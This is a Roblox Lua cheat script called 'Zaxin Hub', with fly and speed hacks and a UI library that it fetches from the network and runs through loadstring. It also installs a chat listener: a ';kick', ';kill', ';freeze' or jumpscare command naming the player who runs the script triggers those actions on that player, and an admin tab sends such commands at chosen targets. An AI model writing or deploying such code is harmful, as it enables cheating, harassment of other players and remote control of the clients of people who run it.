--// Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

--// Tabelas de Configuração (ATUALIZADO COM 10pereirazzk)
local Autorizados = {
    ["10pereirazzk"] = true,
    ["fh_user1"] = true,
    ["Zelaojg"] = true,
    ["joaoluizzx"] = true,
    ["ZaxinX"] = true,
    [LocalPlayer.Name] = true 
}

local WhiteList = {
    ["10pereirazzk"] = "Admin-User",
    ["fh_user1"] = "Owner",
    ["Zelaojg"] = "Parceiro",
    ["joaoluizzx"] = "Staff",
}

--// Variáveis de Controle
local flying = false
local flySpeed = 50
local bodyGyro, bodyVelocity

--// --- FUNÇÕES DE COMANDO ---

local function MostrarJumpscare(imgId, sndId)
    local gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
    local img = Instance.new("ImageLabel", gui)
    img.Size = UDim2.new(1,0,1,0)
    img.Image = imgId
    img.BackgroundTransparency = 1
    local s = Instance.new("Sound", workspace)
    s.SoundId = sndId
    s.Volume = 10
    s:Play()
    task.wait(3)
    gui:Destroy()
    s:Destroy()
end

local function toggleFly()
    flying = not flying
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not root or not hum then return end

    if flying then
        hum.PlatformStand = true
        bodyGyro = Instance.new("BodyGyro", root)
        bodyGyro.P = 9e4
        bodyGyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        bodyVelocity = Instance.new("BodyVelocity", root)
        bodyVelocity.maxForce = Vector3.new(9e9, 9e9, 9e9)

        task.spawn(function()
            while flying do
                local cam = workspace.CurrentCamera
                bodyGyro.cframe = cam.CFrame
                if hum.MoveDirection.Magnitude > 0 then
                    bodyVelocity.velocity = cam.CFrame.LookVector * flySpeed
                else
                    bodyVelocity.velocity = Vector3.new(0,0,0)
                end
                task.wait()
            end
        end)
    else
        hum.PlatformStand = false
        if bodyGyro then bodyGyro:Destroy() end
        if bodyVelocity then bodyVelocity:Destroy() end
    end
end

local function ProcessarComando(msg, autorNome)
    local texto = msg:lower()
    local meuNome = LocalPlayer.Name:lower()
    
    -- Jumpscares
    if texto:match(";jumps1%s+"..meuNome) then MostrarJumpscare("rbxassetid://126754882337711", "rbxassetid://138873214826309") end
    if texto:match(";jumps2%s+"..meuNome) then MostrarJumpscare("rbxassetid://86379969987314", "rbxassetid://143942090") end
    if texto:match(";jumps3%s+"..meuNome) then MostrarJumpscare("rbxassetid://127382022168206", "rbxassetid://143942090") end
    if texto:match(";jumps4%s+"..meuNome) then MostrarJumpscare("rbxassetid://95973611964555", "rbxassetid://138873214826309") end

    -- Admin
    if texto:match(";kick%s+"..meuNome) then LocalPlayer:Kick("Zaxin Hub Admin") end
    if texto:match(";kill%s+"..meuNome) then if LocalPlayer.Character then LocalPlayer.Character:BreakJoints() end end
    
    if texto:match(";freeze%s+"..meuNome) then 
        local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if h then h.WalkSpeed = 0 h.JumpPower = 0 end 
    end
    
    if texto:match(";unfreeze%s+"..meuNome) then 
        local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if h then h.WalkSpeed = 16 h.JumpPower = 50 end 
    end

    if texto:match(";verifique%s+"..meuNome) then
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if canal then canal:SendAsync("Zaxin_Hub_User_Ativo") end
    end
end

--// Conexão Chat
TextChatService.MessageReceived:Connect(function(msg)
    if msg.TextSource then ProcessarComando(msg.Text, msg.TextSource.Name) end
end)

--// Interface WindUI
if Autorizados[LocalPlayer.Name] then
    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    local Window = WindUI:CreateWindow({
        Title = "Zaxin Hub | Premium",
        Icon = "shield-check",
        Author = "by: ZaxinX",
        Size = UDim2.fromOffset(500, 400),
        Transparent = true
    })

    local MainTab = Window:Tab({ Title = "Principal", Icon = "home" })
    local SelfSection = MainTab:Section({ Title = "Local Player", Opened = true })

    SelfSection:Slider({
        Title = "Velocidade",
        Min = 16, Max = 300, Default = 16,
        Callback = function(v)
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.WalkSpeed = v
            end
        end
    })

    SelfSection:Toggle({
        Title = "Voar (Fly)",
        Value = false,
        Callback = function() toggleFly() end
    })

    local AdminTab = Window:Tab({ Title = "Admin", Icon = "user" })
    local AdminSec = AdminTab:Section({ Title = "Comandos", Opened = true })

    local Target = ""
    AdminSec:Dropdown({
        Title = "Selecionar Alvo",
        Values = (function() local t = {} for _,p in pairs(Players:GetPlayers()) do table.insert(t, p.Name) end return t end)(),
        Callback = function(v) Target = v end
    })

    local function Enviar(c)
        local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if ch and Target ~= "" then ch:SendAsync(";"..c.." "..Target) end
    end

    AdminSec:Button({ Title = "KILL", Callback = function() Enviar("kill") end })
    AdminSec:Button({ Title = "KICK", Callback = function() Enviar("kick") end })
end
